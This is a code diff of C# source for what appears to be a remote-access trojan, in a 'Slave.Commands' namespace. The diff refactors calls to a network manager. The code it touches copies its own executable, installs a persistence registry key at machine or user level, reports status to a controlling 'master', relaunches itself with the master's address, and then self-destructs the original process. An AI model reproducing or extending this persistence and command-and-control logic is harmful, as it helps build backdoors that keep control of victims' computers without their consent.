@@ -2,7 +2,6 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
-using System.Threading;
 using System.Windows.Forms;
 using Microsoft.Win32;
 using Shared;
@@ -21,30 +20,30 @@ namespace Slave.Commands
             if (!CopyFileToDestination(path))
             {
                 // File couldn't be copied, abort
-                GlobalCommandsManager.networkManager.WriteLine("KO");
+                SlaveNetworkManager.GetInstance().WriteLine("KO");
                 return;
             }
             // File copied at <path>
-            GlobalCommandsManager.networkManager.WriteLine(path);
+            SlaveNetworkManager.GetInstance().WriteLine(path);
 
 
             // Try to install the persistance at machine level, it required admin privileges
             if (SetPersistanceRegistryKey(path, true))
             {
-                GlobalCommandsManager.networkManager.WriteLine("OK");
+                SlaveNetworkManager.GetInstance().WriteLine("OK");
             }
             else
             {
-                GlobalCommandsManager.networkManager.WriteLine("KO");
+                SlaveNetworkManager.GetInstance().WriteLine("KO");
                 // Couldn't write the key, setting it at current user level
                 if (SetPersistanceRegistryKey(path, false))
                 {
-                    GlobalCommandsManager.networkManager.WriteLine("OK");
+                    SlaveNetworkManager.GetInstance().WriteLine("OK");
                 }
                 else
                 {
                     // Unsuccessfull operation
-                    GlobalCommandsManager.networkManager.WriteLine("KO");
+                    SlaveNetworkManager.GetInstance().WriteLine("KO");
                     try
                     {
                         // Remove copied executable
@@ -57,9 +56,8 @@ namespace Slave.Commands
                     }
                 }
             }
-
-            var slaveNetManager = (SlaveNetworkManager) GlobalCommandsManager.networkManager;
-            var masterInfos = slaveNetManager.GetMasterInfos();
+            
+            var masterInfos = SlaveNetworkManager.GetInstance().GetMasterInfos();
             var newProcess = new Process()
             {
                 StartInfo = new ProcessStartInfo(path, $"{masterInfos.Item1} {masterInfos.Item2 + 1}")
@@ -67,7 +65,7 @@ namespace Slave.Commands
             newProcess.Start();
 
             // Wait for confirmation from the master
-            if (GlobalCommandsManager.networkManager.ReadLine() == "connected")
+            if (SlaveNetworkManager.GetInstance().ReadLine() == "connected")
             {
                 var selfDestructProcess = new Process()
                 {
